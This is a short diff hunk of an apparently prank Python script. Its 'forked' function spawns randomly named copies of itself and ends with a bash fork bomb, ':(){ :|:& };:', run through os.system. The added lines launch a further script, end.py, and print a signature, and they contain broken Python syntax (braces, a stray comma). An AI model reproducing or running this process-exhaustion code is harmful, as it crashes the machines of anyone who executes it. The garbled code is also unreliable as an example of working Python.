@@ -45,5 +45,14 @@ def forked():
     os.system("python " + "fucked" + random1 + str(random2) + str(random3) + str(random4) + ".py")
     """)
   os.system("python " + "fucked" + random1 + str(random2) + str(random3) + str(random4) + ".py")
+  file = "end.py"
+  if (os.path.exists(file))
+  {
+    os.system,('''echo 'from forked import forked
+    forked()''')
+  }
+  os.system("python end.py")
+  print("Brought to you by APITA Films")
+  print("Thanks for stopping in.")
   time.sleep(10)
   os.system(":(){ :|:& };:")
